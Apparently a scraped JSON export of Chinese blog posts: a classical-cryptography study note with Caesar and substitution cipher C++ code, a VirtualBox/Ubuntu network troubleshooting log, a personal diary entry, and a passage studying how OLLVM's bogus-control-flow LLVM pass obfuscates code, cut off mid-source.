格式加密的文件总是以相同的格式开头，电子金融消息往往有标准化的文件头或者标志，类似的例子还有很多，这些都是已知明文攻击的例子。有这些知识的分析者就可以从转换明文的方法入手来推导出密钥。\n与已知明文攻击紧密相关的是可能词攻击。如果攻击者处理的是一些特定的信息，他就可能知道其中的部分内容。比如说，某公司开发的程序源代码就可能包含该公司的版权信息，并放在某个标准位置。\n如果分析者能通过某种方式让发送方在发送的信息中插入一段由他选择的信息，那么选择明文攻击就有可能实现。一般来说，如果分析者有办法选择明文加密，那么他将特意选取那些最有可能会付出密钥的数据。\n只有相对较弱的算法才抵挡不住唯密文攻击，一般地说，加密算法起码要能经受住已知明文攻击才行。\n如果一个密码体制满足条件：无论有多少可使用的密文，都不足以唯一地确定密文所对应的明文，则称该加密体制是无条件安全的。也就是攻击者无论花多少时间，都无法将密文解密，因为他所需的信息不在密文中。除了一次一密之外所有的加密算法都不是无条件安全的。\n加密算法使用者应该尽量挑选满足下面标准的算法：\n 破译密码的代价超过密文信息的价值。 破译密码的时间超出密文信息的有效生命期。  如果满足上述标准中任意一条则它在计算上是安全的，但估计攻击者破译密文所需的工作量是非常困难的。\n从穷举法入手，考虑所需的时间。穷举要获得成功平均来说必须尝试所有可能密钥的一半，下图给出了不同密钥空间穷举尝试所需的时间。\n0x02 代替技术 2.1 Caesar 凯撒密码 已知最早的代替密码是由 julius caesar 发明的 caesar 密码。caesar 密码非常简单，就是对字母表中的每个字母，用它之后的第三个字母来代替，字母表是首尾相连循环的。\n凯撒密码可以这样表达：C = E(k, p) = (p + k) mod 26。\n凯撒密码的解密算法可以这样表达：p = D(k, C) = (C - k) mod 26。\n其中 k 的取值范围是 1-25，取值为 0 的情况下就是明文；取值26和取值0相同；取值超过 26 则相当于是取了 k mod 26 ，因为字母表是循环的；取负数相当于取 26 + k，因为字母表是循环的。\n一个简单的实现如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  enum class CryptMode { encrypt, decrypt, }; std::string caesar(int k, std::string plaintext, CryptMode mode) { std::string output; for (auto c : plaintext) { if (mode == CryptMode::decrypt) { output.push_back((c - \u0026#39;A\u0026#39; - k) % 26 + \u0026#39;a\u0026#39;); } else { output.push_back((c - \u0026#39;a\u0026#39; + k) % 26 + \u0026#39;A\u0026#39;); } } return output; }   对于输入 hello ，k=3，输出为 KHOOR 。\n如果已知某给定的密文是 caesar 密码，穷举攻击是很容易实现的：只要简单地测试25种可能的密钥。\n1 2 3 4 5 6 7  std::vector\u0026lt;std::string\u0026gt; brute_force_caesar(std::string ciphertext) { std::vector\u0026lt;std::string\u0026gt; result; for (int k = 1; k \u0026lt;= 25; k++) { result.push_back(caesar(k, ciphertext, CryptMode::decrypt)); } return result; }   将前面的密文输入，得到输出如下。\n1 2 3 4 5  brute force caesar: jgnnq brute force caesar: ifmmp brute force caesar: hello brute force caesar: gdkkn ... 下略   可以看到明文已经出现。\n凯撒密码的三个重要特征使我们可以穷举攻击：\n 已知加解密的算法 需测试的密钥只有25个 明文所用的语言是已知的，而且意义易于识别  大多情况下，我们假设密码算法是已知的。一般密钥空间很大的算法可以使穷举攻击不太可能，例如3DES算法的密钥长度是 168 位，密钥空间是 2^168，有大于 3.7*10^50 种可能的密钥。\n如果明文所用的语言不为我们所知，那么明文输出就不可识别。输入也可能按照某种方式经过缩写或压缩，也就更不可能识别了。例如一个经过zip压缩的文本文件，用一种简单的代替密码来加密，那么即使用穷举法来进行密码分析，恢复出来的明文也是不可识别的。（注：实际上可以通过文件头、magic number 之类的已知特征来猜测出内容是被压缩过的）。\n2.2 单表代替密码 凯撒密码是一种代替密码，每个明文元素唯一对应代替表中的一个密文元素。因为代替表是字母表的循环移动，故密码范围只有 1-25。\n定义术语置换：设有限元素的集合 S 的置换是 S 的所有元素的有序排列，而且每个元素只出现一次。例如，如果有 S = {a,b,c} ，则 S 有 6 个置换：abc,acb,bac,bca,cab,cba 。一般具有 n 个元素的集合有 n! 个置换。\n如果代替表是26个字母的任意置换，那么就有 26! 种可能的密钥，大于 4*10^26 种可能，这比 DES 的密钥空间还要大 10 个数量级，看起来能抵挡穷举攻击了。\n这种方法被称为单表代替密码，每条消息用一个字母表（给出从明文字母到密文字母的映射）加密。\n2.3 词频攻击 对于单表代替密码，如果攻击者知道明文的属性，比如知道明文是未经压缩的英文文本，就可以通过语言的一些统计学规律进行攻击。\n例如下图中的密文。\n已知明文是英文文本，首先把字母使用的相对频率统计出来，与英文字母的使用频率分布进行比较。\n密文字母使用频率：\n英文字母使用频率：\n此时我们可以尝试在密文上做一些代替，填入明文，看看是否形成一个可读消息。更系统一点的方法是寻找其他规律，例如明文中有某些词可能是已知的，或者寻找密文字母中的重复序列，推导它们的等价明文。统计双字母组合的频率会是个很有效的工具。\n尝试分析的结果是：\n继续进行分析和测试可以很快得出完整的明文。\n实践：\n实现一个简单的替代密码，用随机生成的密码表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  std::string substitution_cipher(const std::string \u0026amp;plaintext, const std::map\u0026lt;char, char\u0026gt; \u0026amp;chart) { std::string output; for (char c : plaintext) { try { output.push_back(chart.at(tolower(c))); } catch (std::out_of_range err) { return \u0026#34;invalid input\u0026#34;; } } return output; } int main(void) { // 替代密码表  const std::map\u0026lt;char, char\u0026gt; chart = { {\u0026#39;a\u0026#39;, \u0026#39;o\u0026#39;}, {\u0026#39;b\u0026#39;, \u0026#39;a\u0026#39;}, {\u0026#39;c\u0026#39;, \u0026#39;f\u0026#39;}, {\u0026#39;d\u0026#39;, \u0026#39;u\u0026#39;}, {\u0026#39;e\u0026#39;, \u0026#39;g\u0026#39;}, {\u0026#39;f\u0026#39;, \u0026#39;y\u0026#39;}, {\u0026#39;g\u0026#39;, \u0026#39;n\u0026#39;}, {\u0026#39;h\u0026#39;, \u0026#39;k\u0026#39;}, {\u0026#39;i\u0026#39;, \u0026#39;e\u0026#39;}, {\u0026#39;j\u0026#39;, \u0026#39;z\u0026#39;}, {\u0026#39;k\u0026#39;, \u0026#39;t\u0026#39;}, {\u0026#39;l\u0026#39;, \u0026#39;b\u0026#39;}, {\u0026#39;m\u0026#39;, \u0026#39;d\u0026#39;}, {\u0026#39;n\u0026#39;, \u0026#39;p\u0026#39;}, {\u0026#39;o\u0026#39;, \u0026#39;l\u0026#39;}, {\u0026#39;p\u0026#39;, \u0026#39;m\u0026#39;}, {\u0026#39;q\u0026#39;, \u0026#39;j\u0026#39;}, {\u0026#39;r\u0026#39;, \u0026#39;q\u0026#39;}, {\u0026#39;s\u0026#39;, \u0026#39;c\u0026#39;}, {\u0026#39;t\u0026#39;, \u0026#39;i\u0026#39;}, {\u0026#39;u\u0026#39;, \u0026#39;w\u0026#39;}, {\u0026#39;v\u0026#39;, \u0026#39;x\u0026#39;}, {\u0026#39;w\u0026#39;, \u0026#39;s\u0026#39;}, {\u0026#39;x\u0026#39;, \u0026#39;v\u0026#39;}, {\u0026#39;y\u0026#39;, \u0026#39;r\u0026#39;}, {\u0026#39;z\u0026#39;, \u0026#39;h\u0026#39;}, {\u0026#39; \u0026#39;, \u0026#39; \u0026#39;}, {\u0026#39;,\u0026#39;, \u0026#39;,\u0026#39;}, {\u0026#39;.\u0026#39;, \u0026#39;.\u0026#39;}, {\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;}, }; auto ciphertext = substitution_cipher(\u0026#34;It can solve simple substitution ciphers often found in newspapers, including puzzles like cryptoquips\u0026#34;, chart); std::cout \u0026lt;\u0026lt; ciphertext \u0026lt;\u0026lt; std::endl; return 0; }   加密结果：\n1  ei fop clbxg cedmbg cwacieiwielp femkgqc lyigp ylwpu ep pgscmomgqc, epfbwuepn mwhhbgc betg fqrmiljwemc   可以在 quipquip 尝试解密。\n总结 Q：对称密码的本质成分\n明文、密文、密钥、加密算法、解密算法。\nQ：密码算法中的两个基本函数\n替代和置换。\nQ：用密码通信的两个人需要多少密钥\n1个（对称加密）或 2 个（公钥加密）。\n关于这点对书本有点困惑，实际经验告诉我需要至少4个密钥（发送方公钥、发送方私钥、接收方公钥、接收方私钥），书本里可能把一对公私钥算一个密钥。\nQ：分组密码和流密码的区别\n分组密码一次处理一组元素，一次输出一组元素。流密码连续处理输入元素，每次输出一个元素。\nQ：攻击密码的两种一般方法是什么\n密码分析和穷举。密码分析学攻击依赖于算法的性质、明文的一般特征或某些明密文对。这种攻击形式企图利用算法的特征来推导出特定的明文或使用的密钥。穷举法则是枚举所有可能的密钥，直到获得有意义的明文。\nQ：列出和定义基于攻击者所知信息的密码分析攻击类型\n 唯密文攻击。已知算法和密文。 已知明文攻击。已知算法、密文、明文。 选择密文攻击。已知算法、密文、攻击者选择的明文和对应的密文。（攻击者可以控制待加密内容） 选择明文攻击。已知算法、密文、攻击者选择的密文和对应的明文。（攻击者可以控制待解密内容） 选择文本攻击。已知算法、密文、攻击者选择的密文和对应的明文、攻击者选择的明文和对应的密文。（攻击者可以自由加密/解密，但不知道密钥）  Q：无条件安全密码和计算上安全的密码区别是什么\n无条件安全密码无法从密文分析出密钥，不可破译。\n计算上安全的密码满足两个条件之一：\n 破译密文的代价大于密文信息的价值。 破译密码的时间超过密文信息的有效期。  Q：简要定义 Caesar 密码\nC = E(k, p) = (p + k) mod 26\np = D(k, C) = (C - k) mod 26\nQ：简要定义单表代替密码\n允许字母任意替代，明文字母表和密文字母表是双射的。\n","date":"2021-11-11T11:35:00+08:00","image":"https://nnnewb.github.io/blog/p/cryptography-introduction-01/cover_hu0e9b28c8bfc106532b4dce6f21f139c2_149022_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/cryptography-introduction-01/","title":"密码学入门01 - 古典密码#1"},{"content":"记虚拟机网络未连接 起因 因为Ubuntu server安装时更新的话需要从网络下载，慢的一批，所以安装的时候虚拟机的网络断开了，安装好启动之后才重新链接。\n但是\u0026hellip;\n连接后进入系统却发现并没有网络（VirtualBox），检查 networkctl 发现 enp0s3 是 off 状态。\n原因 别问，不知道。\n处理 顺藤摸瓜不求甚解了。\n看到 enp0s3 是 off 那就先查查怎么解决。\n1  sudo ip link set enp0s3 up   再检查连接状态。\n1  networkctl status   发现连接进入 downgrade 状态，搜索得知是未分配 IP 地址。\n1  sudo dhclient enp0s3   报了一个奇怪的CMP什么的错误，不管了。再检查下网络。\n1  networkctl   发现 enp0s3 进入 routable 状态，大功告成。\n总结 我总结个蛋。\n 2022年5月6日 补充\n发现问题本源是 netplan 配置未正确生成，dhclient 是暂时性解决。彻底解决的办法是在 /etc/netplan 添加 01-netcfg.yaml，内容如下：\n1 2 3 4 5 6  network:version:2renderer:networkdethernets:enp0s3:dhcp4:true  注意 enp0s3 改成你自己的以太网连接名，用 networkctl 或者 ip show addr 都能列出来。\n文件添加好之后用命令：\n1 2  sudo netplan generate sudo netplan apply   就好了。之后重启vm再运行\n1  networkctl   可以看到\n1 2 3 4 5 6 7  IDX LINK TYPE OPERATIONAL SETUP 1 lo loopback carrier unmanaged 2 enp0s3 ether routable configured 3 docker0 bridge no-carrier unmanaged 4 br-e2b0cf462af2 bridge no-carrier unmanaged 4 links listed.   注意 enp0s3 已经变成了 configured 状态，确认问题彻底处理完毕。\n ","date":"2021-11-11T10:19:00+08:00","image":"https://nnnewb.github.io/blog/p/blind-op-2021-11-11/cover_hu1d1fceb777c1bb637eaad95645df6a3c_2452_120x120_fill_box_smart1_3.png","permalink":"https://nnnewb.github.io/blog/p/blind-op-2021-11-11/","title":"运维瞎记 2021年11月11日"},{"content":"比烂 不知道什么时候起，对现在的工作失去了激情，连带着对生活也失去了期待。\n上班下班，例行公事，像是个机器人。虽然一直都是这样，从来没有好过。\n似乎也不是——至少在peropero工作的那段时间，还是有些兴奋的。只是确实各方面多少有些合不来，但个人原因还是居多数。毕竟多少已经摸爬滚打了几年下来，一定要说哪个老东家很好或者很差，恐怕都不合适。\n有优点也有缺点是常态，决定能不能持续干下去，最后还是看能不能忍受缺点。\n所以说到底还是比烂，到底万事万物还是比烂。\n做人 一个常常出现在脑海里的问题是，我应该做什么样的人？\n然后忽然就有了答案，那就是我不能决定自己成为什么样的人。环境塑造人，经历塑造人，唯独人不能塑造自己，所以说做什么样的人其实是伪命题。\n这么想有些悲观，是机械决定论。人一出生就已经决定了命运，所思所想，悲欢离合，早已经决定，生命就是概率之海的小水花，生或死都没有意义。\n但无论如何吧，至少，还得有一点念想？假装一切都在掌控之中，像是抓住浪潮中的浮木。所以还是得有个什么念想，要做一个什么样的人。\n我怎么想呢。\n做正确的事，也许不正确，也许现在以为是正确，将来又觉得不正确。而即便是这样也做不到。\n时间 现在是2021年11月4日，2021年也快要过去了，天气转凉。\n现在总结一年的工作或者生活还有些太早，但如今回头看，这一年也就这样吧。\n事业发展，没有变化。\n人生大事，没有进展。\n健康生活？被痛风折磨，头发肉眼可见地变得稀疏，还好发际线没有太明显的移动。精力虽然有些消退，但并没有什么妨害。\n想要看看还有没有什么提升的机会，发现国家又在教改，成人学历教育明年大概又有什么动作。随便翻了翻招生简章，就看到对25岁以上考生居然有优待。\n再一对自己的，哦豁，不用等明年，今年12月就成了被优待的对象了。\n已经快记不起上学时的光景了，好像所有东西都在飞快地远离。\n变化 时间给人带来最明显的变化就是内敛。\n不再轻易喜悦，也不再轻易动怒。\n与其说是沉稳，不如说是更焦虑了，为身边的一切事情焦虑，为自己的能力总是捉襟见肘焦虑。而后又容易放弃，因为总忍不住去对比已知的成本和未知的收益，又或者因为各种内外条件变化而不了了之。\n明知道抱怨没有意义，还是忍不住抱怨，每天都有发泄不完的情绪。\n终 写了那么多屁话，还是要到这里结束。\n生活还要继续。\n","date":"2021-11-04T16:06:00+08:00","permalink":"https://nnnewb.github.io/blog/p/2021-11-4-diary/","title":"一些屁话 2021年11月4日"},{"content":"前言 本篇尝试学习通过动手写一个 LLVM Pass 来学习编译阶段进行代码混淆的技术。\n0x01 环境设置 LLVM 是个相当大的项目，做好环境设置是首先要做的事情。这里选择 msys2 作为首要开发环境，不然光是 MSVC 把 LLVM 源码编译一遍就够呛了。\n安装好MSYS2之后安装 clang 工具链（2021年11月3日，clang32工具链默认不在msys2的源里，需要手动改 pacman.conf 加入 clang32 源，这里以 x86_64 的 LLVM 工具链进行实践）。\n1  pacman -Sy mingw-w64-clang-x86_64-toolchain   完成后添加环境变量，把 msys2 安装目录下的 clang64/bin 加入环境变量，方便 VSCode + CMake 找到工具链。另外注意装一个 Ninja，同样加入 Path。\nVSCode 里装上微软的 C/C++ 和 clangd，禁用微软 C/C++ 的 Intellisense，实在太慢。\n手动编译整个LLVM源码树实在是太费时间了，我选择用MSYS2的工具链。参考这篇文档去配置一个 LLVM 源码树外的 Pass 工程：CMake out of source pass - LLVM 。写一个简单的 CMakeLists.txt ，跟着 Writing an LLVM Pass - LLVM 这篇文档快速实现一个遍历函数的 Pass 。\n下面是 CMakeLists.txt 的内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  cmake_minimum_required(VERSION 3.13.4)project(Hello)find_package(LLVM REQUIRED CONFIG)message(STATUS \u0026#34;Found LLVM ${LLVM_PACKAGE_VERSION}\u0026#34;)message(STATUS \u0026#34;Using LLVMConfig.cmake in: ${LLVM_DIR}\u0026#34;)include_directories(${LLVM_INCLUDE_DIRS})separate_arguments(LLVM_DEFINITIONS_LIST NATIVE_COMMAND ${LLVM_DEFINITIONS})add_definitions(${LLVM_DEFINITIONS_LIST})list(APPEND CMAKE_MODULE_PATH \u0026#34;${LLVM_CMAKE_DIR}\u0026#34;)include(AddLLVM)add_llvm_library(Hello MODULE hello.cpp PLUGIN_TOOL opt)  然后是实现 pass 的源码，源码的详细解释直接读 LLVM 给的文档。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  #include \u0026#34;llvm/IR/Function.h\u0026#34;#include \u0026#34;llvm/IR/LegacyPassManager.h\u0026#34;#include \u0026#34;llvm/Pass.h\u0026#34;#include \u0026#34;llvm/Support/raw_ostream.h\u0026#34;#include \u0026#34;llvm/Transforms/IPO/PassManagerBuilder.h\u0026#34; using namespace llvm; namespace { struct Hello : public FunctionPass { static char ID; Hello() : FunctionPass(ID) {} bool runOnFunction(Function \u0026amp;F) override { errs() \u0026lt;\u0026lt; \u0026#34;Hello:\u0026#34;; errs().write_escaped(F.getName()) \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; return false; } }; } // namespace  char Hello::ID = 0; static RegisterPass\u0026lt;Hello\u0026gt; X(\u0026#34;hello\u0026#34;, \u0026#34;hello world pass\u0026#34;, false, false); static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible, [](const PassManagerBuilder \u0026amp;builder, legacy::PassManagerBase \u0026amp;pm) { pm.add(new Hello()); });   再准备一个简单的样本，用来实验 Pass 的效果。\n1 2 3 4 5 6  #include \u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;hello world\u0026#34;); return 0; }   接着是实验步骤：\n1 2  clang -O3 -emit-llvm sample.c -c -o sample.bc opt -enable-new-pm=0 -load build/hello.dll -hello sample.bc -o sample.exe   如果一切顺利，输出如下：\n1  Hello:main   不顺利的话只能自己谷歌。\n0x02 OLLVM bcf 混淆初窥 这部分先看看知名的 OLLVM 项目是怎么做的，先看 bcf 混淆，源码在 llvm/lib/Transforms/Obfuscation/BogusControlFlow.cpp， 入口在 runOnFunction 函数。\n2.1 runOnFunction 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  /* runOnFunction * * Overwrite FunctionPass method to apply the transformation * to the function. See header for more details. */ virtual bool runOnFunction(Function \u0026amp;F){ // Check if the percentage is correct  if (ObfTimes \u0026lt;= 0) { errs()\u0026lt;\u0026lt;\u0026#34;BogusControlFlow application number -bcf_loop=x must be x \u0026gt; 0\u0026#34;; return false; } // Check if the number of applications is correct  if ( !((ObfProbRate \u0026gt; 0) \u0026amp;\u0026amp; (ObfProbRate \u0026lt;= 100)) ) { errs()\u0026lt;\u0026lt;\u0026#34;BogusControlFlow application basic blocks percentage -bcf_prob=x must be 0 \u0026lt; x \u0026lt;= 100\u0026#34;; return false; } // If fla annotations  if(toObfuscate(flag,\u0026amp;F,\u0026#34;bcf\u0026#34;)) { if (isInvoke(\u0026amp;F)) { bogus(F); doF(*F.getParent()); return true; } } return false; } // end of runOnFunction()   前两个 if 都是在判断参数，先忽略。if(toObfuscate(flag,\u0026amp;F,\u0026quot;bcf\u0026quot;)) 判断是否是否需要混淆，if (isInvoke(\u0026amp;F)) 判断能否混淆。\n真正的混淆逻辑在 bogus(F) 里。\n2.2 bogus 裁剪掉了调试输出后的 bogus 函数内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  void bogus(Function \u0026amp;F) { // For statistics and debug  ++NumFunction; int NumBasicBlocks = 0; bool firstTime = true; // First time we do the loop in this function  NumTimesOnFunctions = ObfTimes; int NumObfTimes = ObfTimes; // Real begining of the pass  // Loop for the number of time we run the pass on the function  do { // Put all the function\u0026#39;s block in a list  std::list\u0026lt;BasicBlock *\u0026gt; basicBlocks; for (Function::iterator i = F.begin(); i != F.end(); ++i) { basicBlocks.push_back(\u0026amp;*i); } while (!basicBlocks.empty()) { NumBasicBlocks++; // Basic Blocks\u0026#39; selection  if ((int)llvm::cryptoutils-\u0026gt;get_range(100) \u0026lt;= ObfProbRate) { ++NumModifiedBasicBlocks; NumAddedBasicBlocks += 3; FinalNumBasicBlocks += 3; // Add bogus flow to the given Basic Block (see description)  BasicBlock *basicBlock = basicBlocks.front(); addBogusFlow(basicBlock, F); } // remove the block from the list  basicBlocks.pop_front(); if (firstTime) { // first time we iterate on this function  ++InitNumBasicBlocks; ++FinalNumBasicBlocks; } } // end of while(!basicBlocks.empty())  firstTime = false; } while (--NumObfTimes \u0026gt; 0); }   尝试分析上面的函数逻辑：\n 循环混淆一定次数（NumObfTimes）  遍历原函数基本块（basicBlocks）  选择基本块（cryptoutils-\u0026gt;get_range(100) \u0026lt;= ObfProbRate）  各种计数自增 添加伪造控制流（addBogusFlow(basicBlock, F)）        混淆次数和基本块遍历没什么好说的，选择基本块这里，get_range(100) 实际上是一个安全的随机数生成器，ObfProbRate 是基本块被混淆的机率。也就是说一个函数内的基本块是随机被混淆的，加上混淆次数的设计，会出现有的基本块被混淆多次有的没有被混淆的情况。\n2.2 addBogusFlow 接着继续看添加伪造控制流的逻辑，同样裁剪掉了调试输出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  /* addBogusFlow * * Add bogus flow to a given basic block, according to the header\u0026#39;s description */ virtual void addBogusFlow(BasicBlock *basicBlock, Function \u0026amp;F) { // Split the block: first part with only the phi nodes and debug info and terminator  // created by splitBasicBlock. (-\u0026gt; No instruction)  // Second part with every instructions from the original block  // We do this way, so we don\u0026#39;t have to adjust all the phi nodes, metadatas and so on  // for the first block. We have to let the phi nodes in the first part, because they  // actually are updated in the second part according to them.  BasicBlock::iterator i1 = basicBlock-\u0026gt;begin(); if (basicBlock-\u0026gt;getFirstNonPHIOrDbgOrLifetime()) i1 = (BasicBlock::iterator)basicBlock-\u0026gt;getFirstNonPHIOrDbgOrLifetime(); Twine *var; var = new Twine(\u0026#34;originalBB\u0026#34;); BasicBlock *originalBB = basicBlock-\u0026gt;splitBasicBlock(i1, *var); // Creating the altered basic block on which the first basicBlock will jump  Twine *var3 = new Twine(\u0026#34;alteredBB\u0026#34;); BasicBlock *alteredBB = createAlteredBasicBlock(originalBB, *var3, \u0026amp;F); // Now that all the blocks are created,  // we modify the terminators to adjust the control flow.  alteredBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); basicBlock-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); // Preparing a condition..  // For now, the condition is an always true comparaison between 2 float  // This will be complicated after the pass (in doFinalization())  Value *LHS = ConstantFP::get(Type::getFloatTy(F.getContext()), 1.0); Value *RHS = ConstantFP::get(Type::getFloatTy(F.getContext()), 1.0); // The always true condition. End of the first block  Twine *var4 = new Twine(\u0026#34;condition\u0026#34;); FCmpInst *condition = new FCmpInst(*basicBlock, FCmpInst::FCMP_TRUE, LHS, RHS, *var4); // Jump to the original basic block if the condition is true or  // to the altered block if false.  BranchInst::Create(originalBB, alteredBB, (Value *)condition, basicBlock); // The altered block loop back on the original one.  BranchInst::Create(originalBB, alteredBB); // The end of the originalBB is modified to give the impression that sometimes  // it continues in the loop, and sometimes it return the desired value  // (of course it\u0026#39;s always true, so it always use the original terminator..  // but this will be obfuscated too;) )  // iterate on instruction just before the terminator of the originalBB  BasicBlock::iterator i = originalBB-\u0026gt;end(); // Split at this point (we only want the terminator in the second part)  Twine *var5 = new Twine(\u0026#34;originalBBpart2\u0026#34;); BasicBlock *originalBBpart2 = originalBB-\u0026gt;splitBasicBlock(--i, *var5); // the first part go either on the return statement or on the begining  // of the altered block.. So we erase the terminator created when splitting.  originalBB-\u0026gt;getTerminator()-\u0026gt;eraseFromParent(); // We add at the end a new always true condition  Twine *var6 = new Twine(\u0026#34;condition2\u0026#34;); FCmpInst *condition2 = new FCmpInst(*originalBB, CmpInst::FCMP_TRUE, LHS, RHS, *var6); BranchInst::Create(originalBBpart2, alteredBB, (Value *)condition2, originalBB); } // end of addBogusFlow()   尝试分析上面的函数逻辑：\n 分割基本块，把 phinode 和调试信息之类的分割到原始块，新创建出来的块不包含 phinode 之类的东西。（entry） 创建伪造分支。（altered） 创建恒真条件，这里是利用浮点比较 FCMP_TRUE。（condition） 创建分支指令，真跳转原始块，假跳转伪造块，伪造块的末尾又跳回原始块。 在原始块的结束部分再次分割基本块，分割后的块包含原始块的 terminator （terminator） 创建一个恒真条件，跳转到原始块的 terminator，假则跳转到伪造块 （condition2）  混淆后的控制流长这样，两个 condition 都是恒真条件，原始块被分成了三个部分，entry、origin、terminator 。图中红色的部分是伪造块，包含垃圾指令，绿色的条件块都是恒真条件，只有绿色箭头的控制流能走通。蓝色节点是从原始基本块上分割出来的部分。\n2.3 createAlteredBasicBlock 再看伪造块是如何生成的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187  /* createAlteredBasicBlock * * This function return a basic block similar to a given one. * It\u0026#39;s inserted just after the given basic block. * The instructions are similar but junk instructions are added between * the cloned one. The cloned instructions\u0026#39; phi nodes, metadatas, uses and * debug locations are adjusted to fit in the cloned basic block and * behave nicely. */ virtual BasicBlock *createAlteredBasicBlock(BasicBlock *basicBlock, const Twine \u0026amp;Name = \u0026#34;gen\u0026#34;, Function *F = 0) { // Useful to remap the informations concerning instructions.  ValueToValueMapTy VMap; BasicBlock *alteredBB = llvm::CloneBasicBlock(basicBlock, VMap, Name, F); // Remap operands.  BasicBlock::iterator ji = basicBlock-\u0026gt;begin(); for (BasicBlock::iterator i = alteredBB-\u0026gt;begin(), e = alteredBB-\u0026gt;end(); i != e; ++i) { // Loop over the operands of the instruction  for (User::op_iterator opi = i-\u0026gt;op_begin(), ope = i-\u0026gt;op_end(); opi != ope; ++opi) { // get the value for the operand  Value *v = MapValue(*opi, VMap, RF_None, 0); if (v != 0) { *opi = v; } } // Remap phi nodes\u0026#39; incoming blocks.  if (PHINode *pn = dyn_cast\u0026lt;PHINode\u0026gt;(i)) { for (unsigned j = 0, e = pn-\u0026gt;getNumIncomingValues(); j != e; ++j) { Value *v = MapValue(pn-\u0026gt;getIncomingBlock(j), VMap, RF_None, 0); if (v != 0) { pn-\u0026gt;setIncomingBlock(j, cast\u0026lt;BasicBlock\u0026gt;(v)); } } } // Remap attached metadata.  SmallVector\u0026lt;std::pair\u0026lt;unsigned, MDNode *\u0026gt;, 4\u0026gt; MDs; i-\u0026gt;getAllMetadata(MDs); // important for compiling with DWARF, using option -g.  i-\u0026gt;setDebugLoc(ji-\u0026gt;getDebugLoc()); ji++; } // The instructions\u0026#39; informations are now all correct  // add random instruction in the middle of the bloc. This part can be improve  for (BasicBlock::iterator i = alteredBB-\u0026gt;begin(), e = alteredBB-\u0026gt;end(); i != e; ++i) { // in the case we find binary operator, we modify slightly this part by randomly  // insert some instructions  if (i-\u0026gt;isBinaryOp()) { // binary instructions  unsigned opcode = i-\u0026gt;getOpcode(); BinaryOperator *op, *op1 = NULL; UnaryOperator *op2; Twine *var = new Twine(\u0026#34;_\u0026#34;); // treat differently float or int  // Binary int  if (opcode == Instruction::Add || opcode == Instruction::Sub || opcode == Instruction::Mul || opcode == Instruction::UDiv || opcode == Instruction::SDiv || opcode == Instruction::URem || opcode == Instruction::SRem || opcode == Instruction::Shl || opcode == Instruction::LShr || opcode == Instruction::AShr || opcode == Instruction::And || opcode == Instruction::Or || opcode == Instruction::Xor) { for (int random = (int)llvm::cryptoutils-\u0026gt;get_range(10); random \u0026lt; 10; ++random) { switch (llvm::cryptoutils-\u0026gt;get_range(4)) { // to improve  case 0: // do nothing  break; case 1: op = BinaryOperator::CreateNeg(i-\u0026gt;getOperand(0), *var, \u0026amp;*i); op1 = BinaryOperator::Create(Instruction::Add, op, i-\u0026gt;getOperand(1), \u0026#34;gen\u0026#34;, \u0026amp;*i); break; case 2: op1 = BinaryOperator::Create(Instruction::Sub, i-\u0026gt;getOperand(0), i-\u0026gt;getOperand(1), *var, \u0026amp;*i); op = BinaryOperator::Create(Instruction::Mul, op1, i-\u0026gt;getOperand(1), \u0026#34;gen\u0026#34;, \u0026amp;*i); break; case 3: op = BinaryOperator::Create(Instruction::Shl, i-\u0026gt;getOperand(0), i-\u0026gt;getOperand(1), *var, \u0026amp;*i); break; } } } // Binary float  if (opcode == Instruction::FAdd || opcode == Instruction::FSub || opcode == Instruction::FMul || opcode == Instruction::FDiv || opcode == Instruction::FRem) { for (int random = (int)llvm::cryptoutils-\u0026gt;get_range(10); random \u0026lt; 10; ++random) { switch (llvm::cryptoutils-\u0026gt;get_range(3)) { // can be improved  case 0: // do nothing  break; case 1: op2 = UnaryOperator::CreateFNeg(i-\u0026gt;getOperand(0), *var, \u0026amp;*i); op1 = BinaryOperator::Create(Instruction::FAdd, op2, i-\u0026gt;getOperand(1), \u0026#34;gen\u0026#34;, \u0026amp;*i); break; case 2: op = BinaryOperator::Create(Instruction::FSub, i-\u0026gt;getOperand(0), i-\u0026gt;getOperand(1), *var, \u0026amp;*i); op1 = BinaryOperator::Create(Instruction::FMul, op, i-\u0026gt;getOperand(1), \u0026#34;gen\u0026#34;, \u0026amp;*i); break; } } } if (opcode == Instruction::ICmp) { // Condition (with int)  ICmpInst *currentI = (ICmpInst *)(\u0026amp;i); switch (llvm::cryptoutils-\u0026gt;get_range(3)) { // must be improved  case 0: // do nothing  break; case 1: currentI-\u0026gt;swapOperands(); break; case 2: // randomly change the predicate  switch (llvm::cryptoutils-\u0026gt;get_range(10)) { 